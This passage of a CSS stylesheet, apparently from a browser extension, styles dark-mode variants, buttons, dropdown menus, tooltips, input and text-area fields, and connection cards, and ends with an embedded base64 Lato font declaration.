          background-color: rgb(var(--white-fixed))
        }

        :is(.dark .dark\:fill-black) {
          fill: rgb(var(--black-fixed))
        }

        :is(.dark .dark\:fill-white) {
          fill: rgb(var(--white-fixed))
        }

        :is(.dark .dark\:stroke-black) {
          stroke: rgb(var(--black-fixed))
        }

        :is(.dark .dark\:stroke-gray-5) {
          stroke: #ffffff54
        }

        :is(.dark .dark\:stroke-white) {
          stroke: rgb(var(--white-fixed))
        }

        :is(.dark .dark\:text-caution-foreground) {
          color: rgb(var(--text-caution))
        }

        :is(.dark .dark\:text-disabled-foreground) {
          color: var(--text-disabled)
        }

        :is(.dark .dark\:text-gray-dark-200) {
          --tw-text-opacity: 1;
          color: rgb(207 207 207/var(--tw-text-opacity))
        }

        :is(.dark .dark\:text-grey-neutral) {
          color: rgb(var(--fill-grey-neutral))
        }

        :is(.dark .dark\:text-primary-accent-foreground) {
          color: rgb(var(--text-accent-primary))
        }

        :is(.dark .dark\:text-primary-foreground) {
          color: rgb(var(--text-primary))
        }

        :is(.dark .dark\:text-success-foreground) {
          color: rgb(var(--text-success))
        }

        :is(.dark .dark\:text-white) {
          color: rgb(var(--white-fixed))
        }

        :is(.dark .dark\:shadow-gray-200) {
          --tw-shadow-color: #1b1b1b33;
          --tw-shadow: var(--tw-shadow-colored)
        }

        :is(.dark .dark\:checked\:border-primary:checked) {
          border-color: rgb(var(--fill-accent-primary))
        }

        :is(.dark .dark\:hover\:border-gray-dark-950:hover) {
          border-color: #75757575
        }

        :is(.dark .dark\:checked\:hover\:border-secondary:hover:checked) {
          border-color: rgb(var(--fill-accent-secondary))
        }

        :is(.dark .dark\:focus\:ring-white:focus) {
          --tw-ring-color: rgb(var(--white-fixed))
        }

        :is(.dark .focus-visible\:dark\:outline-white):focus-visible {
          outline-color: rgb(var(--white-fixed))
        }

        :is(.dark .dark\:disabled\:border-disabled:disabled) {
          border-color: var(--fill-accent-disabled)
        }

        :is(.dark .dark\:disabled\:bg-transparent:disabled) {
          background-color: initial
        }

        @media (forced-colors:active) {
          :is(.dark .forced-colors\:dark\:outline-white) {
            outline-color: rgb(var(--white-fixed))
          }
        }

        .extension-button-base {
          padding: .25em 1em;
          white-space: nowrap
        }

        .extension-button-base:disabled {
          cursor: not-allowed
        }

        .extension-button-base {
          border-color: #0000;
          border-radius: .25em;
          border-width: 1px;
          font-size: 1em;
          line-height: 1.5em;
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .extension-button-base:focus-visible {
          outline-color: rgb(var(--black-fixed));
          outline-offset: 2px;
          outline-style: solid;
          outline-width: 2px
        }

        :is(.dark .extension-button-base):focus-visible {
          outline-color: rgb(var(--white-fixed))
        }

        .extension-button-primary {
          background-color: rgb(var(--fill-accent-primary))
        }

        .extension-button-primary:hover {
          background-color: rgb(var(--fill-accent-secondary))
        }

        .extension-button-primary:active {
          background-color: rgb(var(--fill-accent-tertiary))
        }

        .extension-button-primary:disabled {
          background-color: var(--fill-grey-disabled)
        }

        .extension-button-primary {
          color: rgb(var(--text-on-accent-primary))
        }

        .extension-button-primary:active,
        .extension-button-primary:hover {
          color: var(--text-on-accent-secondary)
        }

        .extension-button-primary:disabled {
          color: var(--text-on-accent-disabled)
        }

        .extension-button-secondary {
          background-color: rgb(var(--background-high))
        }

        .extension-button-secondary:hover {
          background-color: rgb(var(--fill-grey-secondary))
        }

        .extension-button-secondary:active {
          background-color: rgb(var(--fill-grey-tertiary))
        }

        .extension-button-secondary:disabled {
          background-color: var(--fill-grey-disabled)
        }

        .extension-button-secondary,
        .extension-button-secondary:active,
        .extension-button-secondary:hover {
          border-color: rgb(var(--stroke-card-soft))
        }

        .extension-button-secondary:disabled {
          border-color: var(--fill-accent-disabled)
        }

        .extension-button-secondary,
        .extension-button-secondary:active,
        .extension-button-secondary:hover {
          color: rgb(var(--text-secondary))
        }

        .extension-button-secondary:disabled {
          color: var(--text-disabled)
        }

        .extension-button-content-script-transparent {
          background-color: initial;
          border-color: rgb(var(--white-fixed));
          color: rgb(var(--white-fixed))
        }

        .extension-button-disabled {
          --tw-bg-opacity: 1;
          background-color: rgb(208 209 211/var(--tw-bg-opacity))
        }

        :is(.dark .extension-button-disabled) {
          background-color: #ffffff26
        }

        .extension-button-disabled {
          color: rgb(var(--white-fixed))
        }

        :is(.dark .extension-button-disabled) {
          color: #ffffff5c
        }

        .extension-button-disabled {
          cursor: not-allowed
        }

        .extension-icon-button-base:hover {
          background-color: rgb(var(--fill-grey-secondary))
        }

        .extension-icon-button-base:active {
          background-color: rgb(var(--background-high))
        }

        .extension-icon-button-base {
          cursor: pointer
        }

        .extension-icon-button-base:disabled {
          cursor: not-allowed
        }

        .extension-icon-button-base {
          border-radius: .25em;
          font-size: 1em;
          line-height: 1.5em;
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .extension-icon-button-base:focus-visible {
          outline-color: rgb(var(--black-fixed));
          outline-offset: 2px;
          outline-style: solid;
          outline-width: 2px
        }

        :is(.dark .extension-icon-button-base):focus-visible {
          outline-color: rgb(var(--white-fixed))
        }

        .extension-icon-button {
          background-color: initial
        }

        .extension-icon-button-secondary {
          --tw-bg-opacity: 1;
          background-color: rgb(252 252 252/var(--tw-bg-opacity))
        }

        :is(.dark .extension-icon-button-secondary) {
          --tw-bg-opacity: 1;
          background-color: rgb(41 41 41/var(--tw-bg-opacity))
        }

        svg.extension-icon-flag {
          border-radius: 9999px;
          border-style: solid;
          border-width: 1px;
          --tw-border-opacity: 1;
          border-color: rgb(237 237 237/var(--tw-border-opacity))
        }

        :is(.dark svg.extension-icon-flag) {
          --tw-border-opacity: 1;
          border-color: rgb(45 45 45/var(--tw-border-opacity))
        }

        .dropdown-container {
          position: relative
        }

        .dropdown-container-default {
          background-color: rgb(var(--background-high));
          border-color: var(--stroke-card-medium);
          border-radius: .25em;
          border-width: 1px;
          text-align: left
        }

        .dropdown-container-default:hover {
          background-color: rgb(var(--stroke-card-soft))
        }

        .dropdown-container-default:focus {
          outline: 2px solid #0000;
          outline-offset: 2px;
          --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
          --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
          box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
          --tw-ring-color: rgb(var(--black-fixed));
          --tw-ring-offset-width: 2px;
          --tw-ring-offset-color: #ededed
        }

        :is(.dark .dropdown-container-default:focus) {
          --tw-ring-color: rgb(var(--white-fixed));
          --tw-ring-offset-color: #2d2d2d
        }

        .dropdown-container.disabled {
          background-color: var(--fill-accent-disabled);
          border-color: var(--fill-accent-disabled);
          cursor: not-allowed
        }

        :is(.dark .dropdown-container.disabled) {
          background-color: #ffffff26;
          border-color: #ffffff26
        }

        .dropdown-input:has(.icon-btn) {
          padding: .5em
        }

        .dropdown-selected-value {
          color: rgb(var(--text-primary));
          display: flex;
          font-size: .875em;
          line-height: 1.43em
        }

        .disabled .dropdown-selected-value {
          color: #1b1b1b5c
        }

        :is(.dark .disabled .dropdown-selected-value) {
          color: #ffffff5c
        }

        .disabled .dropdown-selected-value svg.canBeDisabled {
          stroke: #1b1b1b5c
        }

        :is(.dark .disabled .dropdown-selected-value svg.canBeDisabled) {
          stroke: #ffffff5c
        }

        .disabled .dropdown-tool svg {
          fill: #1b1b1b5c
        }

        :is(.dark .disabled .dropdown-tool svg) {
          fill: #ffffff5c
        }

        .dropdown-input {
          align-items: center;
          display: flex;
          justify-content: space-between;
          padding: .25em .5em;
          user-select: none;
          --tw-border-opacity: 1;
          border-color: rgb(237 237 237/var(--tw-border-opacity));
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .dropdown-input:focus-visible {
          outline-color: rgb(var(--black-fixed));
          outline-offset: 2px;
          outline-style: solid;
          outline-width: 2px
        }

        :is(.dark .dropdown-input):focus-visible {
          outline-color: rgb(var(--white-fixed))
        }

        .dropdown-input-icon-btn {
          padding: .25em
        }

        .dropdown-menu {
          --tw-shadow: 4px 8px 8px #1b1b1b1f;
          --tw-shadow-colored: 4px 8px 8px var(--tw-shadow-color)
        }

        .dropdown-menu,
        :is(.dark .dropdown-menu) {
          box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        :is(.dark .dropdown-menu) {
          --tw-shadow: 4px 8px 16px #000000a3;
          --tw-shadow-colored: 4px 8px 16px var(--tw-shadow-color)
        }

        .dropdown-menu {
          background-color: rgb(var(--white-fixed));
          border-color: #1b1b1b4d;
          border-radius: .25em;
          border-width: 1px;
          max-height: 300px;
          overflow: auto;
          padding: .25em;
          z-index: 10
        }

        :is(.dark .dropdown-menu) {
          background-color: rgb(var(--black-fixed));
          border-color: #75757575
        }

        .dropdown-menu>:not([hidden])~:not([hidden]) {
          --tw-space-y-reverse: 0;
          margin-bottom: calc(.5em*var(--tw-space-y-reverse));
          margin-top: calc(.5em*(1 - var(--tw-space-y-reverse)))
        }

        .dropdown-menu {
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .dropdown-menu:focus-visible {
          outline-color: rgb(var(--black-fixed));
          outline-offset: 2px;
          outline-style: solid;
          outline-width: 2px
        }

        :is(.dark .dropdown-menu):focus-visible {
          outline-color: rgb(var(--white-fixed))
        }

        .dropdown-item {
          border-radius: .375em;
          color: rgb(var(--text-primary));
          cursor: pointer;
          font-size: .875em;
          line-height: 1.43em;
          padding: .375em .5em;
          user-select: none
        }

        .dropdown-item:hover {
          background-color: rgb(var(--fill-grey-tertiary))
        }

        :is(.dark .dropdown-item:hover) {
          color: rgb(var(--white-fixed))
        }

        .dropdown-item.dropdown-item-selected {
          background-color: rgb(var(--fill-grey-tertiary));
          position: relative
        }

        .dropdown-item.dropdown-item-selected:before {
          background-color: rgb(var(--fill-accent-primary));
          border-radius: 9999px;
          bottom: 0;
          display: inline-block;
          height: 1em;
          left: 0;
          margin-bottom: auto;
          margin-top: auto;
          position: absolute;
          top: 0;
          width: 3px;
          --tw-content: "";
          content: var(--tw-content)
        }

        .dropdown-item.dropdown-item-keyboard-selected {
          background-color: rgb(var(--fill-grey-tertiary))
        }

        .extension-tooltip {
          border-color: #1b1b1b4d;
          border-radius: .25em;
          border-width: 1px
        }

        :is(.dark .extension-tooltip) {
          border-color: #75757575
        }

        .extension-tooltip {
          background-color: rgb(var(--white-fixed))
        }

        :is(.dark .extension-tooltip) {
          background-color: rgb(var(--black-fixed))
        }

        .extension-tooltip {
          --tw-shadow: 0px 8px 8px #1b1b1b1f;
          --tw-shadow-colored: 0px 8px 8px var(--tw-shadow-color);
          box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .menu-link-holder {
          flex-direction: row;
          flex-wrap: wrap;
          height: 2.75em;
          position: relative;
          width: 2.75em
        }

        .menu-link,
        .menu-link-active,
        .menu-link-holder {
          align-content: center;
          display: flex;
          justify-content: center
        }

        .menu-link,
        .menu-link-active {
          border-radius: .5em;
          flex: 1 1 0%;
          flex-wrap: wrap;
          height: 100%;
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .menu-link-active:focus-visible,
        .menu-link:focus-visible {
          outline-color: rgb(var(--black-fixed));
          outline-offset: 0;
          outline-style: solid;
          outline-width: 2px
        }

        :is(.dark .menu-link):focus-visible,
        :is(.dark .menu-link-active):focus-visible {
          outline-color: rgb(var(--white-fixed))
        }

        .menu-link:hover {
          --tw-bg-opacity: 1;
          background-color: rgb(250 250 250/var(--tw-bg-opacity))
        }

        :is(.dark .menu-link:hover) {
          background-color: #1b1b1bad
        }

        .menu-link-active {
          background-color: rgb(var(--white-fixed))
        }

        :is(.dark .menu-link-active) {
          background-color: rgb(var(--black-fixed))
        }

        .menu-link-active-accent {
          background-color: rgb(var(--fill-accent-primary));
          border-radius: 9999px;
          bottom: 6px;
          height: 3px;
          left: 0;
          margin-left: auto;
          margin-right: auto;
          position: absolute;
          right: 0;
          width: .875em
        }

        .bottombar-container {
          border-bottom-left-radius: .25em;
          border-bottom-right-radius: .25em;
          height: 48px;
          max-height: 48px;
          min-height: 48px;
          --tw-bg-opacity: 1;
          background-color: rgb(246 246 246/var(--tw-bg-opacity))
        }

        :is(.dark .bottombar-container) {
          --tw-bg-opacity: 1;
          background-color: rgb(56 56 56/var(--tw-bg-opacity))
        }

        .topbar-container {
          background-color: rgb(var(--background-low));
          border-top-left-radius: .25em;
          border-top-right-radius: .25em;
          height: 42px;
          max-height: 42px;
          min-height: 42px
        }

        .extension-section {
          border-radius: .375em;
          border-width: 1px;
          --tw-border-opacity: 1;
          border-color: rgb(237 237 237/var(--tw-border-opacity))
        }

        :is(.dark .extension-section) {
          --tw-border-opacity: 1;
          border-color: rgb(45 45 45/var(--tw-border-opacity))
        }

        .extension-flag-button-base {
          background-color: initial
        }

        .extension-flag-button-base:disabled {
          cursor: not-allowed
        }

        .extension-flag-button-base {
          border-radius: .25em;
          cursor: pointer;
          font-size: 1em;
          line-height: 1.5em;
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .extension-flag-button-base:focus-visible {
          outline-color: rgb(var(--black-fixed));
          outline-offset: 2px;
          outline-style: solid;
          outline-width: 2px
        }

        :is(.dark .extension-flag-button-base):focus-visible {
          outline-color: rgb(var(--white-fixed))
        }

        .extension-input-field {
          box-sizing: border-box;
          width: 100%
        }

        .extension-input-field,
        .extension-input-field:focus {
          outline: 2px solid #0000;
          outline-offset: 2px;
          --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
          --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
          box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .extension-input-field {
          border-color: #1b1b1b4d;
          border-radius: .375em;
          border-width: 1px
        }

        :is(.dark .extension-input-field) {
          border-color: #75757575
        }

        .extension-input-field:disabled {
          border-color: #1b1b1b4d;
          cursor: not-allowed
        }

        .extension-input-field:focus {
          border-color: rgb(var(--fill-accent-primary))
        }

        .extension-input-field {
          color: rgb(var(--black-fixed));
          padding: .5em 1.5em .5em 1em
        }

        :is(.dark .extension-input-field) {
          color: rgb(var(--white-fixed))
        }

        .extension-input-field {
          font-size: .875em;
          line-height: 1.43em
        }

        .extension-input-field::placeholder {
          font-style: normal;
          --tw-text-opacity: 1;
          color: rgb(94 94 94/var(--tw-text-opacity))
        }

        :is(.dark .extension-input-field)::placeholder {
          --tw-text-opacity: 1;
          color: rgb(207 207 207/var(--tw-text-opacity))
        }

        .extension-input-field {
          background-color: rgb(var(--white-fixed))
        }

        :is(.dark .extension-input-field) {
          --tw-bg-opacity: 1;
          background-color: rgb(56 56 56/var(--tw-bg-opacity))
        }

        .extension-input-field[type=password]::-ms-clear,
        .extension-input-field[type=password]::-ms-reveal {
          display: none
        }

        .extension-textarea-field {
          box-sizing: border-box;
          width: 100%
        }

        .extension-textarea-field,
        .extension-textarea-field:focus {
          outline: 2px solid #0000;
          outline-offset: 2px;
          --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
          --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
          box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .extension-textarea-field {
          border-color: #1b1b1b4d;
          border-radius: .375em;
          border-width: 1px
        }

        :is(.dark .extension-textarea-field) {
          border-color: #75757575
        }

        .extension-textarea-field:disabled {
          border-color: #1b1b1b4d;
          cursor: not-allowed
        }

        .extension-textarea-field:focus {
          --tw-border-opacity: 1;
          border-color: rgb(62 95 255/var(--tw-border-opacity))
        }

        .extension-textarea-field {
          color: rgb(var(--black-fixed));
          padding: .5em
        }

        :is(.dark .extension-textarea-field) {
          color: rgb(var(--white-fixed))
        }

        .extension-textarea-field {
          font-size: .875em;
          line-height: 1.43em
        }

        .extension-textarea-field::placeholder {
          font-style: normal;
          --tw-text-opacity: 1;
          color: rgb(94 94 94/var(--tw-text-opacity))
        }

        :is(.dark .extension-textarea-field)::placeholder {
          --tw-text-opacity: 1;
          color: rgb(207 207 207/var(--tw-text-opacity))
        }

        .extension-textarea-field {
          background-color: rgb(var(--white-fixed))
        }

        :is(.dark .extension-textarea-field) {
          --tw-bg-opacity: 1;
          background-color: rgb(56 56 56/var(--tw-bg-opacity))
        }

        .extension-face-button-base {
          background-color: initial
        }

        .extension-face-button-base:hover {
          --tw-bg-opacity: 1;
          background-color: rgb(248 248 248/var(--tw-bg-opacity))
        }

        :is(.dark .extension-face-button-base:hover) {
          --tw-bg-opacity: 1;
          background-color: rgb(41 41 41/var(--tw-bg-opacity))
        }

        .extension-face-button-base {
          border-width: 1px;
          --tw-border-opacity: 1;
          border-color: rgb(208 209 211/var(--tw-border-opacity))
        }

        :is(.dark .extension-face-button-base) {
          --tw-border-opacity: 1;
          border-color: rgb(45 45 45/var(--tw-border-opacity))
        }

        .extension-face-button-base {
          border-radius: 100%;
          cursor: pointer
        }

        .extension-face-button-base:disabled {
          cursor: not-allowed
        }

        .extension-face-button-base {
          font-size: 1em;
          line-height: 1.5em;
          outline: 2px solid #0000;
          outline-offset: 2px
        }

        .extension-face-button-base:focus-visible {
          outline-color: rgb(var(--black-fixed));
          outline-offset: 2px;
          outline-style: solid;
          outline-width: 2px
        }

        :is(.dark .extension-face-button-base):focus-visible {
          outline-color: rgb(var(--white-fixed))
        }

        .extension-face-button-active {
          --tw-bg-opacity: 1;
          background-color: rgb(248 248 248/var(--tw-bg-opacity))
        }

        :is(.dark .extension-face-button-active) {
          --tw-bg-opacity: 1;
          background-color: rgb(41 41 41/var(--tw-bg-opacity))
        }

        .extension-connection-card-layout {
          border-radius: .375em
        }

        .extension-connection-card-layout>:not([hidden])~:not([hidden]) {
          --tw-divide-y-reverse: 0;
          border-bottom-width: calc(1px*var(--tw-divide-y-reverse));
          border-top-width: calc(1px*(1 - var(--tw-divide-y-reverse)));
          --tw-divide-opacity: 1;
          border-color: rgb(237 237 237/var(--tw-divide-opacity))
        }

        :is(.dark .extension-connection-card-layout)>:not([hidden])~:not([hidden]) {
          --tw-divide-opacity: 1;
          border-color: rgb(45 45 45/var(--tw-divide-opacity))
        }

        .extension-connection-card-layout {
          border-width: 1px;
          --tw-border-opacity: 1;
          border-color: rgb(237 237 237/var(--tw-border-opacity))
        }

        :is(.dark .extension-connection-card-layout) {
          --tw-border-opacity: 1;
          border-color: rgb(45 45 45/var(--tw-border-opacity))
        }

        .extension-connection-card-search-input {
          box-sizing: border-box;
          width: 100%
        }

        .extension-connection-card-search-input,
        .extension-connection-card-search-input:focus {
          outline: 2px solid #0000;
          outline-offset: 2px;
          --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
          --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
          box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .extension-connection-card-search-input {
          background-color: rgb(var(--white-fixed))
        }

        :is(.dark .extension-connection-card-search-input) {
          background-color: rgb(var(--black-fixed))
        }

        .extension-connection-card-search-input {
          border-radius: .375em;
          border-width: 1px;
          --tw-border-opacity: 1;
          border-color: rgb(237 237 237/var(--tw-border-opacity))
        }

        :is(.dark .extension-connection-card-search-input) {
          --tw-border-opacity: 1;
          border-color: rgb(45 45 45/var(--tw-border-opacity))
        }

        .extension-connection-card-search-input:disabled {
          border-color: #1b1b1b4d;
          cursor: not-allowed
        }

        .extension-connection-card-search-input:focus {
          border-bottom-color: rgb(var(--fill-accent-primary));
          border-bottom-width: 2px
        }

        .extension-connection-card-search-input {
          color: rgb(var(--text-primary));
          font-size: .875em;
          line-height: 1.43em
        }

        .extension-connection-card-search-input::placeholder {
          font-style: normal;
          --tw-text-opacity: 1;
          color: rgb(94 94 94/var(--tw-text-opacity))
        }

        :is(.dark .extension-connection-card-search-input)::placeholder {
          --tw-text-opacity: 1;
          color: rgb(207 207 207/var(--tw-text-opacity))
        }

        .extension-connection-card-search-input:focus {
          margin-bottom: -1px
        }

        .extension-connection-card-search-entry {
          border-radius: .375em
        }

        .extension-connection-card-search-entry.extension-connection-card-search-entry-highlight:hover {
          --tw-bg-opacity: 1;
          background-color: rgb(250 250 250/var(--tw-bg-opacity))
        }

        :is(.dark .extension-connection-card-search-entry.extension-connection-card-search-entry-highlight:hover) {
          --tw-bg-opacity: 1;
          background-color: rgb(32 32 32/var(--tw-bg-opacity))
        }

        @font-face {
          font-display: swap;
          font-family: Lato;
          font-style: normal;
          font-weight: 400;
          src: url(data:font/woff;charset=utf-8;base64,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) format("woff2");
          unicode-range: u+0100-024f, u+0259, u+1e??, u+2020, u+20a0-20ab, u+20ad-20cf, u+2113, u+2c60-2c7f, u+a720-a7ff
        }

        @font-face {
          font-display: swap;
          font-family: Lato;
          font-style: normal;
          font-weight: 400;
